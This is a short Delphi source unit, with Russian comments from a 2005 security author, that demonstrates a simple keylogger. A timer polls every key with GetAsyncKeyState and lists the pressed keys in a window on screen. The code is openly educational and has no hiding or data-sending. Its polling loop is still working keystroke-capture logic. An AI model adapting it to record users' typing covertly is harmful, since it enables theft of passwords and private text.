unit Unit1;
// Демонстрационный пример №2. Простейший "Клавиатурный шпион" на базе
// периодического опроса состояния клавиатуры
// Зайцев О.В, 2005. http://z-oleg.com/secur, http://z-oleg.com/delphi
interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls;

type
  TfrmMain = class(TForm)
    Memo1: TMemo;
    tmKeyStateCheckTimer: TTimer;
    procedure tmKeyStateCheckTimerTimer(Sender: TObject);
  private
    { Private declarations }
  public
  end;

var
  frmMain: TfrmMain;

implementation

{$R *.dfm}          

procedure TfrmMain.tmKeyStateCheckTimerTimer(Sender: TObject);
var
 i, res : integer;
 S : string;
begin
 S := '';
 // Цикл опроса состояния клавиш
 for i := 0 to 255 do begin
  // Запрос состояния клавиши i
  Res := GetAsyncKeyState(i);
  // Клавиша i нажата ?
  if Res <> 0 then
   if MapVirtualKey(i, 2) > 0 then    // Добавим к строке символ или код клавиши
    S := S + char(MapVirtualKey(i, 2))
     else S := S+'['+inttostr(i)+']';
 end;
 // Добавление данных к протоколу (если есть что добавлять)
 if length(s) > 0 then
  Memo1.Lines.Add('Нажаты клавиши "'+S+'"');
end;

end.
